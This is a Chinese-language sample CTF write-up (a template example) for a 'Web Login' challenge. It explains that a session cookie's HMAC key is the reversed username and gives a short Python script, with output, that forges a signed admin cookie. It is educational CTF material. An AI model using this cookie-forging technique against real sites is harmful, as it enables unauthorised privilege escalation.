# Web Login

> 这是一份**示例 Writeup**，展示模板填写后的效果，可删。

- **赛事**：0CTF Quals 2024
- **分类**：`web`
- **难度**：`medium`
- **分值**：300
- **完成时间**：2024-03-16 22:40
- **队友**：solo
- **附件**：无（给定 URL）

## 题目信息

登录页面，提供注册与登录功能，目标是拿到 admin 的 flag。

```
https://web-login.example.ctf/login
```

## 初步分析

- 注册任意用户可正常登录，Cookie 为 `session=base64(json)`
- 尝试修改 Cookie 中的 `username` 字段为 `admin` → 提示签名无效
- 方向锁定：Cookie 伪造 / JWT 弱密钥 / 逻辑缺陷

## 漏洞点

Cookie 的 JSON 结构为 `{"username": "guest", "role": "user"}`，服务端用 `role` 字段鉴权但**仅在校验签名前读取 username**。通过注册用户名为 `admin` 的账号，可使 `username` 字段值为 `admin` 而 `role` 保持 `user`，但服务端实际以 `role` 判定权限 → 此处无果。

真正漏洞：登录成功后 `Set-Cookie` 使用了**可预测的 HMAC 密钥**（密钥为用户名倒序），导致可自签 admin Cookie。

## 利用过程

```python
import base64, hmac, hashlib, json

name = "admin"
key = name[::-1].encode()  # 密钥为 "nimda"
payload = json.dumps({"username": name, "role": "admin"}).encode()
sig = hmac.new(key, payload, hashlib.sha256).hexdigest()
print(base64.urlsafe_b64encode(payload).decode() + "." + sig)
```

```
$ python3 exp.py
eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0=.5f2a...
```

替换 Cookie 后访问 `/admin`，拿到 flag。

## 收获与总结

- JWT/HMAC 类 Cookie 先检查密钥来源，别急着爆破
- 注册同名账号、用户名规范化处理（大小写、空格）是常见绕过点
- 卡点是误以为服务端只认 `username`，实际是 `role` 判定，下次应先审计鉴权函数

## 相关链接

- 官方题解：
- 类似题目：
- 参考文章：
